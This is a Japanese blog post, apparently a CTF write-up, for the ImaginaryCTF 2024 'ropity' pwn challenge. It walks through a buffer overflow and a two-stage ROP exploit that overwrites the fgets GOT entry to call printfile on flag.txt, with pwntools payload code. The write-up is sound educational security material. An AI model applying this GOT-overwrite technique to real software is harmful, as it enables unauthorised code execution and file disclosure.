<h2 id="ropitypwn" style="position:relative;"><a href="#ropitypwn" aria-label="ropitypwn permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>ropity(Pwn)</h2>
<blockquote>
<p>Just your typical ROP challenge</p>
</blockquote>
<p>問題バイナリをデコンパイルしてみると、自明な BoF の存在する main 関数と printfile 関数が存在するのみの小さなバイナリでした。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 817px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/e8f20353cf60479e6a1fb99fe6cb30ad/98314/image-20240722222329557.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 35.833333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABEklEQVQoz42RyW7CQBBE/SuAZ1/MKUHGC8klEorB2Ob/P6VSMw5RLig5PHV110y7e1x8fA4YlxGXacIw3amvuM4LxvlGplXTH5c7htuM82XE+fqcwvoIqQ2s93AhQBkLacw3SbvsC6X/RaGsw7YUCNGiig7eB0hrIbxBqdks7LETCpvtDptd+SeFr/ZwMU3nYUJFXcFXkXlk9PAxkFSrYLiFcc/RpDg0LdpTh6bvUXfvjCfS4tj1aPuGuqP/lvPXusFLfWT8Tf2jD8dmXTmt5IPj2oFwGk5n+bX0jsJolFJxAgdjVyRrKnlaU/Octvnt88prQwmlZT6kmSfzcVEYlR/7UV8bqfyjSkWPzYQyOU8NvwDkC9uRjo0enwAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/e8f20353cf60479e6a1fb99fe6cb30ad/8ac56/image-20240722222329557.webp 240w,
/static/e8f20353cf60479e6a1fb99fe6cb30ad/d3be9/image-20240722222329557.webp 480w,
/static/e8f20353cf60479e6a1fb99fe6cb30ad/57fc4/image-20240722222329557.webp 817w"
              sizes="(max-width: 817px) 100vw, 817px"
              type="image/webp"
            />
          <source
            srcset="/static/e8f20353cf60479e6a1fb99fe6cb30ad/8ff5a/image-20240722222329557.png 240w,
/static/e8f20353cf60479e6a1fb99fe6cb30ad/e85cb/image-20240722222329557.png 480w,
/static/e8f20353cf60479e6a1fb99fe6cb30ad/98314/image-20240722222329557.png 817w"
            sizes="(max-width: 817px) 100vw, 817px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/e8f20353cf60479e6a1fb99fe6cb30ad/98314/image-20240722222329557.png"
            alt="image-20240722222329557"
            title="image-20240722222329557"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>また、問題バイナリを見たときに明らかに不自然に定義されているのはこの printfile 関数です。</p>
<p>この関数は引数として受け取ったファイルパスを使用して open システムコールでファイルディスクリプタを取得し、sendfile システムコールでその中身を print するコードのようです。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 492px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/b0c914d1ef7a053f13e4d8df511ece33/5c6e9/image-20240722224635520.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 74.58333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAACdklEQVQ4y41TSXLbQAzURxyR4ipxFZfhLsrOO3yJJdvR4so1h1zy8U5jJDqyq1KVA4pDcNBAd4Ozp5cdDucn7L/v8fP5gN+vR/x6fcPx9MLcDvvDic8jdjyffux17uV0xuv5jbkDno9nPH7b4/Fpp2PW9D2G7Yh+HDF2PbZth7Ht0er8BuP9PRrmVdOi7lpUTYOadyQq5utuQCXna8y85RJBGMHzlzBtB18WFu7MBVzfx2ZQSNMQ/nIF23Fhuh7sIITFGovfDcPEnHcN1kwxC+MEeZ5rQItFjufBsl3EaYK+VzAtm1N1KMsSqaqQ1DUiTp9uBgR5AV8asM6WZgwN2JCGgPrsLMkFJ43TGKXK2JWAdco7CZSqSashYIm4Jvj2HmvKtYpT3s+QpKkAxsiLAlVVoes7tNTJ9XxESQRVZfhiLFCUCllVIN4U8FYrMnC0BDKZxQEc3v8wYUE6Apyka91FPgRRSPASURwyEk4Rw19HsEWSG4rWBHwNDVhxfDFB6Ald03LYINIaBmGgAcW4KEr09LeAn0NTLsoCGTWsKHjNcK6URcM7Ui5pRlErRE0Gx/8PQNFQUcOmbdFS9EnDus5h0OWMbq6pYfKg4EeB3oJ/A0YXwFKp9wkFUChPLq+zAmmZE7DCkjpqUwTgasoHQNFHAF3u4XIVwGcIJTFl2FScjoZw1zwutxusLkbYf02YjPlAWYDECDFEm2JfTGnbQl+SJu4VyOHZEXA+7U8Ov7u8CkNdKGY42kWPGsbYjrW+lKxz7iEXeRiQ8t/Ovj4g4btzUzPFTP7FuWnibm5wiS8hZ8k5rvP+bU5zTO6gIQzotNTd1kzxBxUe05h7pxFHAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/b0c914d1ef7a053f13e4d8df511ece33/8ac56/image-20240722224635520.webp 240w,
/static/b0c914d1ef7a053f13e4d8df511ece33/d3be9/image-20240722224635520.webp 480w,
/static/b0c914d1ef7a053f13e4d8df511ece33/9d6da/image-20240722224635520.webp 492w"
              sizes="(max-width: 492px) 100vw, 492px"
              type="image/webp"
            />
          <source
            srcset="/static/b0c914d1ef7a053f13e4d8df511ece33/8ff5a/image-20240722224635520.png 240w,
/static/b0c914d1ef7a053f13e4d8df511ece33/e85cb/image-20240722224635520.png 480w,
/static/b0c914d1ef7a053f13e4d8df511ece33/5c6e9/image-20240722224635520.png 492w"
            sizes="(max-width: 492px) 100vw, 492px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/b0c914d1ef7a053f13e4d8df511ece33/5c6e9/image-20240722224635520.png"
            alt="image-20240722224635520"
            title="image-20240722224635520"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>つまり、この printfile 関数の引数として flag.txt を設定できれば、正しい Flag を取得できそうです。</p>
<p>しかし、自明な BoF はあるものの、都合よく使える ROP Gadget がバイナリに存在していないためエクスプロイトに難航しました。</p>
<p>途中で fgets が読み取りに失敗した場合に NULL を返す使用を利用して、sutdown() を使用して rax に 0 を格納したりと色々試しましたが、結局 Flag の取得には至りませんでした。</p>
<p>ちなみに、このプログラムで使用している各システムコールの構造は以下のようになっています。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token function">fgets</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">,</span> FILE <span class="token operator">*</span>stream<span class="token punctuation">)</span>
<span class="token function">open</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>path<span class="token punctuation">,</span> <span class="token keyword">int</span> oflag<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">)</span>
<span class="token function">sendfile</span><span class="token punctuation">(</span><span class="token keyword">int</span> out_fd<span class="token punctuation">,</span> <span class="token keyword">int</span> in_fd<span class="token punctuation">,</span> <span class="token class-name">off_t</span> <span class="token operator">*</span> offset <span class="token string">", size_t"</span> <span class="token string">" count"</span> <span class="token punctuation">)</span></code></pre></div>
<p>参考：<a href="https://linux.die.net/man/3/fgets" target="_blank" rel="nofollow noopener noreferrer">fgets(3): input of char/strings - Linux man page</a></p>
<p>参考：<a href="https://linux.die.net/man/3/open" target="_blank" rel="nofollow noopener noreferrer">open(3): open file - Linux man page</a></p>
<p>参考：<a href="https://linux.die.net/man/2/sendfile" target="_blank" rel="nofollow noopener noreferrer">sendfile(2) - Linux man page</a></p>
<p>ここからは Writeup を参考にしながら解き進めてみます。</p>
<p>参考：<a href="https://vaktibabat.github.io/posts/ictf_2024/" target="_blank" rel="nofollow noopener noreferrer">My Writeups For ImaginaryCTF 2024! | Vaktibabat</a></p>
<p>今回のポイントは、rdi を操作できそうな箇所が fgets 関数呼び出し直前の <code class="language-text">mov     rdi, rax</code> しかなさそうなところでした。</p>
<p>BoF でこのコードを悪用するにも、fgets 関数がついでに実行されてしまうので難しい、、、という風に思い込みがありました。</p>
<p>しかし、今回のバイナリは PIE が無効で GOT のオーバーライドが可能です。</p>
<p>そのため、そもそも fgets の GOT を書き換えてしまえば、rdi の操作を行った後に任意のコードを実行できそうです。</p>
<p>まず最初のステージでは、以下のコードを ROP で悪用して fgets により fgets の GOT をオーバーライドさせることを目指します。</p>
<div class="gatsby-highlight" data-language="nasm"><pre class="language-nasm"><code class="language-nasm">mov     <span class="token register variable">rdx</span>, qword <span class="token operator">[</span>rel stdi<span class="token operator">]</span>
lea     <span class="token register variable">rax</span>, <span class="token operator">[</span><span class="token register variable">rbp</span><span class="token operator">-</span><span class="token number">0x8</span> {buf}<span class="token operator">]</span>
mov     <span class="token register variable">esi</span>, <span class="token number">0x100</span>
mov     <span class="token register variable">rdi</span>, <span class="token register variable">rax</span> {buf}
call    fgets</code></pre></div>
<p>fgets がコールされるとき、rdi には <code class="language-text">rbp-0x8</code> のアドレスに格納されている値が格納されます。</p>
<p>そのため、RBP の置換によって <code class="language-text">rbp-0x8</code> に改ざん対象の GOT のアドレスを埋め込むことで、fgets による GOT オーバーライドを成立させることができます。</p>
<p>実際に Flag を取得するためのエクスプロイトコードは以下のようになります。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python">call_fgets <span class="token operator">=</span> <span class="token number">0x401142</span>
call_printfile <span class="token operator">=</span> <span class="token number">0x40115d</span>
call_gmonstart <span class="token operator">=</span> <span class="token number">0x404040</span>
got_fgets <span class="token operator">=</span> <span class="token number">0x404018</span>
pop_rbp <span class="token operator">=</span> <span class="token number">0x40119b</span>

<span class="token comment"># First</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>
    cyclic<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    pop_rbp<span class="token punctuation">,</span>
    got_fgets<span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">,</span>
    call_fgets<span class="token punctuation">,</span>
<span class="token punctuation">)</span>
target<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

<span class="token comment"># Second</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>
    call_printfile<span class="token punctuation">,</span> <span class="token comment"># &lt;- 0x404018</span>
    call_gmonstart<span class="token punctuation">,</span> <span class="token comment"># &lt;- 0x404020</span>
    call_fgets<span class="token punctuation">,</span> <span class="token comment"># &lt;- 0x404028</span>
    <span class="token string">b"\x00"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token comment"># &lt;- 0x404030</span>
    <span class="token string">b"./flag.txt\x00"</span> <span class="token comment"># &lt;- 0x404038</span>
<span class="token punctuation">)</span>
target<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></code></pre></div>
<p>ちなみに、<code class="language-text">pop rbp; ret</code> のガジェットを使用すると、RBP を任意の値に置き換えることができますが、その時点では RSP の値は変わらないので、スタックに埋め込んだ ROP ガジェットをそのまま使えます。</p>
<p>ただし、その後 leave が呼び出されるタイミングがある場合は、RBP が RSP に置き換えられたあと、RSP(元の RBP) が指すスタックトップが pop されて RBP に置き換えられます。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">leave

↓

mov rsp, rbp
pop rbp</code></pre></div>
<p>そのため、<code class="language-text">pop rbp; ret</code> のガジェットを使用する場合には leave の扱いに注意が必要です。</p>
<p>今回の場合、First stage のペイロードでは RDI に fgets の GOT アドレスを埋め込むところまでを行っています。</p>
<p>続く Second payload では、printfile 関数のアドレスを先頭に差し込んでいます。</p>
<p>これによって、今後 fgets がコールされる場合には、代わりに printfile がコールされるようになります。</p>
<p>fgets が呼び出された後 <code class="language-text">leave; ret</code> の命令があります。</p>
<p>この時点での RBP には <code class="language-text">got_fgets+0x8</code> の値である 0x404020 が格納されています。</p>
<p>つまり、leave 命令が呼び出された際にはまず 0x404020 が RSP になった後、スタックトップが pop されて RBP と置き換えられます。</p>
<p>0x404018 以降のアドレスには、<code class="language-text">call_printfile -> call_gmonstart -> call_fgets -> 0 ->  b"./flag.txt\x00"</code> の順で値が格納されています。</p>
<p>そのため、leave 命令が呼び出された直後には RBP に <code class="language-text">call_gmonstart(0x404040)</code> がセットされ、RSP は元の RBP の値 + 0x8 である 0x404028 が格納されます。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/44acfe8e6f1519eec0e32e37f1d1bf65/e2310/image-20240725202051718.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 74.58333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAAC3UlEQVQ4y22U2Y7jNhBF9RK0RYqkNi6SqMW2bMmO3dM9wCTozOT/P+vmym5kMEEeDoqwamHVLTo5zFfU5ogi6+HMCKsGFKaFNRaNqvhbJBPKuoEfWqiihVAW0nQkQuqWBEj6biSv9xuG4RWH6QpX1DDSIM82NIsoWgEtUyglYEyKLCNSkPQ/iAfJ7XaDq85oqxlTmHCeFqzTBdH2KHUFnecQUkLK7F+y7P+RJFmWBSH2SDMGKYlMKX4kPAshmED+EvAT+ZPPghnPyf1+xx9rj0vUGK1m+znOi0AbMjhvMe5H9GOP2HWwRYFg7cMaJjVMpJlIG57NM2lyPZ+xtmdcyNKfcJ1XXPYnHPoJ+3aPuZ1xjEfE4NEpDU+aDXYRSE2sZ/Hw7CZ5qwPOOwZKzq8ece2uDO4w5BW8oHNqKA5FciWU76CbHobfcxth6a9NgZR+Qmi2r5CE0GNZrhiHA3reqKoLFGzVNjOc3cPnFq2LiP0dZdEjz3smaaHLHkXdQ3G9pCo58/Jhkxgj3t/esa4rjocTXJPy+hqHMMCXFhVFCmWFpmgwqhpH5VAqFs0Ngne0OVsVD0GyreUmNljuC6Z5Qpy43BTDOoH0txfI3QvSNMWOvKQvFEBCkZR7t7ETO7abfqr8JAlDwHQb0Z5a+DEwoUTlDYxrUXQ96iaitB6NGxGLCn1RwmoPLxu+Kscd9sipumInWmsk+2nCj7++45ULfuEsQ5vCdiWG5QtvzbnVFpnenHMUDLo5h6U748THEGRApyMqFum6FjF2SNq4x/X2juPpgmFcUIccta+5kxO88RCp5s5RYQ48Fhazm2AD/aoBZc7dzAcK5Vk4PN578u3bn3j7+hUne8FRrBj1CWtxZ/CIUzPg4Bvum2Z7OVvfRhFgmhF54Egc/zC2J1o6znKbIdfm4+MDP/7+jnv7BWv2O+Y448ybBgZ23IDaWQognu95C9pESHdPS8RDlE+VyT9+dnZj+eXM8QAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/44acfe8e6f1519eec0e32e37f1d1bf65/8ac56/image-20240725202051718.webp 240w,
/static/44acfe8e6f1519eec0e32e37f1d1bf65/d3be9/image-20240725202051718.webp 480w,
/static/44acfe8e6f1519eec0e32e37f1d1bf65/e46b2/image-20240725202051718.webp 960w,
/static/44acfe8e6f1519eec0e32e37f1d1bf65/61c9b/image-20240725202051718.webp 968w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/44acfe8e6f1519eec0e32e37f1d1bf65/8ff5a/image-20240725202051718.png 240w,
/static/44acfe8e6f1519eec0e32e37f1d1bf65/e85cb/image-20240725202051718.png 480w,
/static/44acfe8e6f1519eec0e32e37f1d1bf65/d9199/image-20240725202051718.png 960w,
/static/44acfe8e6f1519eec0e32e37f1d1bf65/e2310/image-20240725202051718.png 968w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/44acfe8e6f1519eec0e32e37f1d1bf65/d9199/image-20240725202051718.png"
            alt="image-20240725202051718"
            title="image-20240725202051718"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>ここでなぜ RBP に 0x404040 がセットされるようにスタックを調整しているかというと、この後 printfile 関数を呼び出す際に、RDI に <code class="language-text">b"./flag.txt\x00"</code> が埋め込まれているアドレスを指定したいからです。</p>
<p>この文字列は 0x404038 に配置されているので、RBP を 0x404040 とすることで <code class="language-text">lea     rax, [rbp-0x8]; mov rdi, rax</code> のコードによって RDI に 0x404038  を格納させています。</p>
<p>これで、GOT オーバーライドを利用して <code class="language-text">printfile(*path, size)</code> をコールすることができるため、Flag を取得することができます。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 681px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/c85ec587172fac07c45d00a5232168e7/8ce52/image-20240725202848580.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 13.333333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAl0lEQVQI122NwQ6CMBAFuba0tLRLETFEMQZI4OLR+P+/NZJGowcPkzeHzWxRLQY7WHzvkasQukDQkWgj46WmFsscE/d0YJZE5R1lWWKMyejdG++5WcdUVhRtm1jnjcf65NyMRC0c7YnWdCTX4vaAiDAMA33f49w3+LsfL2KMrNvKtEwECftHhdrRGZ0PtdYopTL/Ynnf/gLVmkij3BID6wAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/c85ec587172fac07c45d00a5232168e7/8ac56/image-20240725202848580.webp 240w,
/static/c85ec587172fac07c45d00a5232168e7/d3be9/image-20240725202848580.webp 480w,
/static/c85ec587172fac07c45d00a5232168e7/9a301/image-20240725202848580.webp 681w"
              sizes="(max-width: 681px) 100vw, 681px"
              type="image/webp"
            />
          <source
            srcset="/static/c85ec587172fac07c45d00a5232168e7/8ff5a/image-20240725202848580.png 240w,
/static/c85ec587172fac07c45d00a5232168e7/e85cb/image-20240725202848580.png 480w,
/static/c85ec587172fac07c45d00a5232168e7/8ce52/image-20240725202848580.png 681w"
            sizes="(max-width: 681px) 100vw, 681px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/c85ec587172fac07c45d00a5232168e7/8ce52/image-20240725202848580.png"
            alt="image-20240725202848580"
            title="image-20240725202848580"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<h2 id="まとめ" style="position:relative;"><a href="#%E3%81%BE%E3%81%A8%E3%82%81" aria-label="まとめ permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>まとめ</h2>
<p>時間不足でチャレンジできずでしたが、Rev はもう数問解けそうでした。</p>
<p>今後は解ける問題を増やすだけでなく早解きも意識して練習していかないといけなさそうです。</p></div></div></div><div class="Post-module--post__footer--3WzWU"><div><p class="Meta-module--meta__date--29eD7">Published <!-- -->Jul 25, 2024</p></div><div class="Tags-module--tags--1L_ct"><ul class="Tags-module--tags__list--91FqN"><li class="Tags-module--tags__list-item--1M30P"><a class="Tags-module--tags__list-item-link--3SL_8" href="/tag/rev/">Rev</a></li><li class="Tags-module--tags__list-item--1M30P"><a class="Tags-module--tags__list-item-link--3SL_8" href="/tag/pwn/">Pwn</a></li></ul></div><div class="Author-module--author--2Yefr"><p>リバースエンジニアになりたいCTF Player(Team: 0nePadding)。WinDbgとYARAが好き。OSCP / CISSP / AtCoder 緑 Microsoft Japanに所属してます。発言はすべて個人の見解。<a class="Author-module--author__bio-twitter--n-O9n" href="https://www.twitter.com/kash1064" rel="noopener noreferrer" target="_blank"><strong>かしわば</strong> on Twitter</a></p></div></div><div class="Post-module--post__comments--25y6I"></div></div></div></div><div id="gatsby-announcer" style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" aria-live="assertive" aria-atomic="true"></div></div><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/ctf-imaginary-ctf-2024";/*]]>*/</script><script id="gatsby-chunk-mapping">/*<![CDATA[*/window.___chunkMapping={"polyfill":["/polyfill-299cfcade846097f4d4b.js"],"app":["/app-75393366a30b6ef90e4a.js"],"component---cache-caches-gatsby-plugin-offline-app-shell-js":["/component---cache-caches-gatsby-plugin-offline-app-shell-js-fd4fb51a6fac1c18bdde.js"],"component---src-templates-categories-list-template-js":["/component---src-templates-categories-list-template-js-2181ec47d28e5c35d3e9.js"],"component---src-templates-category-template-js":["/component---src-templates-category-template-js-76f2006942127b3c7274.js"],"component---src-templates-index-template-js":["/component---src-templates-index-template-js-70ba56c0f46525baa629.js"],"component---src-templates-not-found-template-js":["/component---src-templates-not-found-template-js-d19905e5c8fc953958f1.js"],"component---src-templates-page-template-js":["/component---src-templates-page-template-js-6ba68ef37e264f701345.js"],"component---src-templates-post-template-js":["/component---src-templates-post-template-js-381c1b847824134fa4bd.js"],"component---src-templates-tag-template-js":["/component---src-templates-tag-template-js-0faa242d92f89b71e668.js"],"component---src-templates-tags-list-template-js":["/component---src-templates-tags-list-template-js-2d7007993fc2bf0f9caf.js"]};/*]]>*/</script><script src="/polyfill-299cfcade846097f4d4b.js" nomodule=""></script><script src="/component---src-templates-post-template-js-381c1b847824134fa4bd.js" async=""></script><script src="/cd95ea5cbd2c605f26db819f07999610c9ff4310-c2f05dc74373de400085.js" async=""></script><script src="/styles-407fe62976dc5310c43e.js" async=""></script><script src="/app-75393366a30b6ef90e4a.js" async=""></script><script src="/dc6a8720040df98778fe970bf6c000a41750d3ae-a9848960b1159a07f14e.js" async=""></script><script src="/532a2f07-92db97c0addf07d5cb73.js" async=""></script><script src="/framework-3761df4ab6ee9f056936.js" async=""></script><script src="/webpack-runtime-a3c0f166cb4b802ff58f.js" async=""></script></body></html>